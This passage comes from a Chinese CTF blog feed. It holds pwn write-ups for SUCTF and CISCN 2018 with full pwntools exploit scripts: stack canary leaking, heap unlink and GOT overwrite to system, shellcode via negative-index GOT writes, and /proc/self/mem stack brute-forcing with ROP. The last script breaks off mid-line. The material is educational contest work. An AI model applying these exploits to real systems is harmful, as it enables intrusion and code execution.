class="string">'pwn.suctf.asuri.org'</span>, <span class="number">20001</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'password'</span>)</span><br><span class="line">        p.sendline(<span class="string">'123456'</span>)</span><br><span class="line">        </span><br><span class="line">        code_base = get_codebase(p)</span><br><span class="line"></span><br><span class="line">        dump = <span class="string">''</span></span><br><span class="line">        addr = code_base + offset</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> len(dump) &lt; length:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'\x0a'</span> <span class="keyword">in</span> p64(addr):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'bad addr'</span>, hex(addr)</span><br><span class="line">                addr += <span class="number">1</span></span><br><span class="line">                dump += <span class="string">'\x00'</span></span><br><span class="line">        </span><br><span class="line">            data = leak_mem(p, addr)</span><br><span class="line">            data += <span class="string">'\x00'</span></span><br><span class="line">            dump += data</span><br><span class="line">            addr += len(data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">print</span> hex(addr)</span><br><span class="line">            <span class="keyword">if</span> count % <span class="number">200</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> dump.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> dump</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumpelf</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">            dumpfile = <span class="string">'dump%02d'</span> % i</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(dumpfile):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'dumpfile %s exists'</span> % dumpfile</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            size = <span class="number">0x400</span></span><br><span class="line">            dump = dumpmem(i*size, size)[:size]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'dump length is '</span>, len(dump)</span><br><span class="line">            open(dumpfile, <span class="string">'wb'</span>).write(dump)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># dumpelf()</span></span><br><span class="line">    <span class="comment"># for i in range(2, 20):</span></span><br><span class="line">    <span class="comment">#     try:</span></span><br><span class="line">    <span class="comment">#         print i, hex(leak_stack(i))</span></span><br><span class="line">    <span class="comment">#     except Exception as e:</span></span><br><span class="line">    <span class="comment">#         print e</span></span><br><span class="line"></span><br><span class="line">    canary = leak_stack(p, <span class="number">15</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'canary is '</span>, hex(canary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'K  '</span>)</span><br><span class="line">    addr = int(p.recvuntil(<span class="string">'--'</span>, drop=<span class="keyword">True</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_byte</span><span class="params">(byte)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> byte &gt;&gt; i == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            bit = (byte &gt;&gt; i) &amp; <span class="number">1</span></span><br><span class="line">            write_mem(p, addr + i*<span class="number">4</span>, bit)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># for i in range(34, 256):</span></span><br><span class="line">    <span class="comment">#     print i</span></span><br><span class="line">    <span class="comment">#     write_byte(i)    </span></span><br><span class="line">    <span class="comment">#     print p.recvline_contains('lock')</span></span><br><span class="line"></span><br><span class="line">    write_byte(<span class="number">35</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Box:'</span>)</span><br><span class="line">    func_flag = int(p.recvline().strip(<span class="string">'\n'</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'func_addr is '</span>, hex(func_flag)</span><br><span class="line">    p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'aaaaaaaaaa'</span>)</span><br><span class="line">    <span class="comment"># p.sendline('a'*offset +  p64(canary) + p64(func_addr))</span></span><br><span class="line">    p.recvuntil(<span class="string">'want?'</span>)</span><br><span class="line">    p.sendline(<span class="string">'b'</span>*<span class="number">0x1A</span> + p64(canary)*<span class="number">2</span> + p64(func_flag)*<span class="number">10</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>):</span><br><span class="line">    pwn(i)</span><br></pre></td></tr></table></figure><h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">free_got=<span class="number">0x602018</span></span><br><span class="line">ptr=<span class="number">0x6020c0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./offbyone'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p= remote(<span class="string">'pwn.suctf.asuri.org'</span>,<span class="number">20004</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'4:edit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input len\n'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'input your data\n'</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'4:edit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input id\n'</span>)</span><br><span class="line">p.send(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'4:edit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input id\n'</span>)</span><br><span class="line">p.send(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'4:edit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input id\n'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'input your data\n'</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">add(<span class="number">136</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">136</span>,<span class="string">'a'</span>))<span class="comment">#0</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'hack by 0gur2'</span>.ljust(<span class="number">128</span>,<span class="string">'b'</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'/bin/sh'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'/bin/sh'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">128</span>,<span class="string">'d'</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">136</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">136</span>,<span class="string">'e'</span>))<span class="comment">#5</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">128</span>,<span class="string">'f'</span>))<span class="comment">#6</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">128</span>,<span class="string">'g'</span>))<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="string">'a'</span>*<span class="number">8</span>+p64(<span class="number">0x81</span>) +p64(ptr+<span class="number">40</span><span class="number">-24</span>)+p64(ptr+<span class="number">40</span><span class="number">-16</span>)</span><br><span class="line">payload= fake_chunk</span><br><span class="line">payload= payload.ljust(<span class="number">0x80</span>,<span class="string">'a'</span>)</span><br><span class="line">payload+=p64(<span class="number">0x80</span>)</span><br><span class="line">payload+=<span class="string">'\x90'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'\x18\x20\x60'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">sys_addr = free_addr-(libc.symbols[<span class="string">'free'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">log.info(<span class="string">'sys_addr:%#x'</span> %sys_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">2</span>,p64(sys_addr))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      写论文已经两周了orz，今天终于写完了... SUCTF完全靠大佬们带飞，躺进XCTF联赛决赛圈了..记录一下本队做出的四道PWN题
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解</title>
    <link href="http://p4nda.top/2018/05/13/ciscn-ctf-2018/"/>
    <id>http://p4nda.top/2018/05/13/ciscn-ctf-2018/</id>
    <published>2018-05-13T06:52:14.000Z</published>
    <updated>2018-07-05T13:29:42.374Z</updated>
    
    <content type="html"><![CDATA[<p>​    拖了好久才来整理全国大学生信息安全竞赛的题解，最近都在忙着DEF CON CHINA的RHG比赛的开发，虽然最后貌似只混了一件T恤… 这次比赛本来不想打的，三、四月份的比赛略多，最后趁着五一的假期，被Misty大佬召唤过来打了一天，队伍名称是Xopowo（俄语好的意思？хорошо）。</p><p><img src="/img/ciscn/0.png" alt=""></p><p>​    最后做出来和复现的有三道：note-service2  、 house_of_grey 、 echo_back</p><h1 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h1><p>这道题给出的hint是</p><p><img src="/img/ciscn/1-1.png" alt=""></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>大致分析了一下题目，题目主要提供了add、delete两个函数：</p><p><img src="/img/ciscn/1-2.png" alt="add函数"></p><p><img src="/img/ciscn/1-3.png" alt="delete函数"></p><p>可能很多人发现的是delete函数那里悬垂指针可被double free的漏洞，但是此题这个漏洞貌似并没有太大的用处，此题存在的问题是，<strong>在add函数中输入index时当index是负数或者一个大于预留数组的size可以越界写的问题</strong>。并且，此题对got表没有开启RELRO保护，且也没有开启NX保护，这样可以输入负数，覆写got表函数地址，劫持到我们申请的堆块上去执行。换句话说这题只是一道写shellcode的题目，由于之前刷过pwnable.tw，认出了这题是Alive Note这题，这题在pwnable.tw上是32位的题目，并且限制了仅能输入0~9A~Za~z。貌似CISCN是改成了64位。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>具体思路我曾经写过blog： <a href="http://www.cnblogs.com/p4nda/p/7992951.html（当我发现这题的原型，在国赛期间我心机的隐藏这篇博客，然而可能并没人看...）" target="_blank" rel="noopener">http://www.cnblogs.com/p4nda/p/7992951.html（当我发现这题的原型，在国赛期间我心机的隐藏这篇博客，然而可能并没人看...）</a></p><p>思路是利用malloc申请堆块的规律，虽然只能写很少的shellcode，但是可以利用jmp等跳转语句直接跳转到下一块堆块去执行，最终利用系统调用syscall拿到shell，此题我预先在第一块堆块上部署好了”/bin/sh”，劫持了free@got，此时rdi指向这个/bin/sh节省了不少步骤。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./task_note_service2_OG37AWm'</span>)</span><br><span class="line">context.update(arch = <span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#ciscn&#123;93707fa0f2eca125f3998d0c6fb1a932&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./task_note_service2_OG37AWm'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'117.78.43.123'</span>, <span class="number">31128</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'your choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">p.sendline(str(<span class="number">8</span>))</span><br><span class="line">p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">add((elf.got[<span class="string">'free'</span>]<span class="number">-0x2020A0</span>)/<span class="number">8</span>,asm(<span class="string">'xor rsi,rsi'</span>)+<span class="string">'\x90\x90\xe9\x16'</span>)</span><br><span class="line">add(<span class="number">1</span>,asm(<span class="string">'push 0x3b\n pop rax'</span>)+<span class="string">'\x90\x90\xe9\x16'</span>)</span><br><span class="line">add(<span class="number">2</span>,asm(<span class="string">'xor rdx,rdx'</span>)+<span class="string">'\x90\x90\xe9\x16'</span>)</span><br><span class="line">add(<span class="number">3</span>,asm(<span class="string">'syscall'</span>)+<span class="string">'\x90'</span>*<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="house-of-grey"><a href="#house-of-grey" class="headerlink" title="house_of_grey"></a>house_of_grey</h1><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>此题的逻辑比较复杂，在main函数中首先利用mmap函数分配了一块内存，再利用clone函数，以mmap动态分配的内存作为栈基址，具体启动了fn函数</p><p><img src="/img/ciscn/2-1.png" alt="main"></p><p>在fn函数中首先利用系统沙箱禁止了大部分的系统调用，然后主要提供了4个函数。</p><p><img src="/img/ciscn/2-2.png" alt="功能"></p><p>漏洞存在于case 1中，在设置文件名称是存在溢出漏洞，可以覆盖v8变量，而v8正是case 4中read的第二个参数，因此总体来说存在内存任意写漏洞。</p><p><img src="/img/ciscn/2-3.png" alt="漏洞"></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先，可以通过读/proc/self/maps来获取各程序段的内存地址，起初以为这样就可以知道全部的内存地址，包括新启动的进程栈地址。</p><p>但在实际尝试过程中，发现fn函数的栈底并不是mmap得到内存块的结束地址，而是在其内部还有随机化。</p><p>另外还在困惑，在任意写时到底应该写在哪里… w1tcher提示我最终利用exit返回，可以劫持这个流程，但是我头铁决定将case 4中的read参数劫持到read函数的返回地址处，也就是是read自身覆写自身的返回地址… 这样在read函数结束时也就返回到了通过写入的rop中。</p><p>这种想法遇到的一个问题是如何拿到随机化的栈地址？</p><p>此时想到另外一个文件/proc/self/mem，这个文件相当于程序内存的一个映射。在测试过程中发现，其栈起始地址与mmap内存块的结束地址相差了一个随机值，而这个随机值是有一定范围的：0xf000000~0xfffffff之间，是可以爆破的，而爆破的过程是，首先利用case 2的定位函数，预先设定一个读取内存地址的起始值，然后不断的向下读，由于程序栈中存在一个明显的字符串标识”/proc/self/mem”，当读到的数据中包含这个字符串时就可以判断找到了栈。</p><p>可以简单验证一下可行性，爆破的次数最多可以有24次（共可以进行30次操作，其他操作占有次数），24*100000 = 2400000 = 0x249f00 ， 而可能的范围是0x1000000 其概率为0.1430511474609375，是可以接受的。</p><p>另外此题的坑点还有系统调用的限制，最终可以通过open(‘/home/ctf/flag’) read(6,buf,0x100) puts(buf)读出。</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./task_house_P4U73bf'</span>)</span><br><span class="line"><span class="comment">#ciscn&#123;57de0cd00899090b7193b2a99508e6db&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./task_house_P4U73bf'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'117.78.43.123'</span>, <span class="number">32619</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Y/n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'finding?'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/proc/self/maps'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'get?'</span>)</span><br><span class="line">p.sendline(<span class="string">'10000'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'something:\n'</span>)</span><br><span class="line">pie = int(<span class="string">'0x'</span>+p.recvuntil(<span class="string">'-'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] pie:'</span>,hex(pie)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a = p.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'heap'</span> <span class="keyword">in</span> a:</span><br><span class="line">a = p.recvline()</span><br><span class="line">stack_start = int(a.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">stack_end = int((a.split(<span class="string">'-'</span>)[<span class="number">1</span>]).split(<span class="string">' '</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack_start:'</span>,hex(stack_start)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack_end:'</span>,hex(stack_end)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a = p.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'libc'</span> <span class="keyword">in</span> a:</span><br><span class="line">libc.address = int(a.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'finding?'</span>)</span><br><span class="line">p.sendline(<span class="string">'/proc/self/mem'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'you?'</span>)</span><br><span class="line">stack_guess = <span class="number">0xf800000</span></span><br><span class="line">p.sendline(str(stack_end - stack_guess - <span class="number">24</span>*<span class="number">100000</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] offset from '</span>,hex( stack_guess + <span class="number">24</span>*<span class="number">100000</span>),<span class="string">'to'</span>,hex(stack_guess)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] from '</span>,hex(stack_end - stack_guess - <span class="number">24</span>*<span class="number">100000</span>),<span class="string">'to'</span>,hex(stack_end - stack_guess)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">24</span>):</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'get?'</span>)</span><br><span class="line">p.sendline(<span class="string">'100000'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'something:\n'</span>)</span><br><span class="line">tmp = p.recvuntil(<span class="string">'1.Find '</span>)[:<span class="number">-7</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">'/mem'</span> <span class="keyword">in</span> tmp:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+++] find'</span></span><br><span class="line"><span class="keyword">print</span> tmp.split(<span class="string">'/proc/self/mem'</span>)[<span class="number">0</span>]</span><br><span class="line">canary = u64(tmp.split(<span class="string">'/proc/self/mem'</span>)[<span class="number">0</span>][<span class="number">-0x48</span>:<span class="number">-0x40</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">stack_address = stack_end - stack_guess - <span class="number">24</span>*<span class="number">100000</span> + i *<span class="number">100000</span> + len(tmp.split(<span class="string">'/proc/self/mem'</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> canary==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] fail'</span></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] canary :'</span>,hex(canary)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack :'</span>,hex(stack_address)</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'finding?'</span>)</span><br><span class="line">p.sendline(<span class="string">'/proc/self/mem'</span>+<span class="string">'\x00'</span>*(<span class="number">0x18</span><span class="number">-14</span>)+p64(stack_address<span class="number">-56</span>))</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">rop =p64(pie+<span class="number">0x0000000000001823</span>)+p64(stack_address<span class="number">-56</span>+<span 